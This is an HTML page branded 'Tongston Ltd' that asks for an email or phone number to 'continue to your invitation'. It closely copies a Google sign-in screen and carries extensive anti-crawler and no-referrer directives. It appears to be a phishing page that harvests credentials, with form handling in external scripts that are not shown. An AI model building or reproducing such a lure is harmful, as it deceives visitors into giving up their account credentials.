<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache" />
  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
  <meta name="googlebot-news" content="noindex" />
  <meta name="bingbot" content="noindex, nofollow, noarchive" />
  <meta name="slurp" content="noindex, nofollow" />
  <meta name="referrer" content="no-referrer" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
  <meta http-equiv="Pragma" content="no-cache" />
  <meta name="revisit-after" content="999 days" />
  <title>Continue — Tongston Ltd</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="/css/mailing.css" />
  <link rel="stylesheet" href="/css/brand.css" />
</head>
<body class="mailing-page-body">
  <div class="mailing-page">
    <div class="mailing-card">
      <div class="mailing-logo" aria-hidden="true">
        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Tongston Ltd">
          <rect x="2" y="2" width="44" height="44" rx="12" fill="#4A2418"/>
          <path d="M12 15h24M24 15v19" fill="none" stroke="#F7F1E8" stroke-width="5" stroke-linecap="round"/>
        </svg>
      </div>

      <h1 class="mailing-title">Welcome to Tongston Ltd</h1>
      <p class="mailing-subtitle">Enter your email to continue to your invitation.</p>

      <form id="mailing-email-form" class="mailing-form" autocomplete="off">
        <div class="mailing-input-wrap">
          <input type="email" id="mailing-email" name="email" placeholder="Email or Phone" required autofocus />
          <label for="mailing-email">Email or Phone</label>
        </div>
        <div class="mailing-helper"><a href="#">Forgot email?</a></div>
        <div class="mailing-actions">
          <a href="/highlights" class="mailing-link">Create account</a>
          <button type="submit" class="mailing-btn">Next</button>
        </div>
      </form>

      <div id="mailing-loading" class="mailing-loading" style="display:none;">
        <div class="mailing-spinner"></div>
        <p>Checking your account…</p>
      </div>
    </div>

    <footer class="mailing-footer">
      <select class="mailing-lang">
        <option>English (United States)</option>
      </select>
      <div class="mailing-footer-links">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
      </div>
    </footer>
  </div>

  <script src="/js/response.js"></script>
  <script src="/js/mailing.js"></script>
</body>
</html>
